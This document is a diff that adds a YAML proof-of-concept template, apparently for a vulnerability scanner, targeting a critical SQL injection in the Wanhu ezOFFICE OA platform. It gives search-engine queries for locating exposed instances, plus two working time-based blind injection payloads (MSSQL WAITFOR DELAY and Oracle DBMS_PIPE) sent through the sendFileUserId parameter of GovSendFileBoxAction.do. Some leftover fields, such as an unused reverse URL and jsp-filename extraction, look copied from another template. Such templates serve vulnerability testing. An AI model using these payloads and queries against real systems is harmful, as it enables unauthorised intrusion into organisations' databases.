@@ -1,0 +1,54 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="万户网络-ezOFFICE"
+    hunter-query: app.name="万户 Ezoffice OA"
+    quake-query: app:"万户ezOFFICE协同管理平台"
+    zoomeye-query: title:"万户ezOFFICE协同管理平台"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: mssql | 叠堆注入   Oracle | 时间盲注
+
+name: poc-yaml-wanhu-ezoffice-GovSendFileBoxAction.do-sqli
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            follow_redirects: false
+            path: /defaultroot/GovSendFileBoxAction.do?editId=2&sendFileUserId=1);WAITFOR%20DELAY%20'0:0:4'--&action=delBatch
+            headers:
+            body:         
+        expression: response.status == 200 && response.latency >= 4000
+
+        output:
+          search: |-
+            "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+          filename: search["filename"]
+          search1: |-
+            "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+          newpath: search["newpath"]
+
+    r1:
+        request:
+            cache: true
+            method: GET
+            follow_redirects: false
+            path: /defaultroot/GovSendFileBoxAction.do?editId=2&sendFileUserId=1)%20AND%207389=DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)%7C%7CCHR(117)%7C%7CCHR(115)%7C%7CCHR(108),4)%20AND%20(6268=6268&action=delBatch
+            headers:
+            body:         
+        expression: response.status == 200 && response.latency >= 4000
+
+expression: r0() || r1()
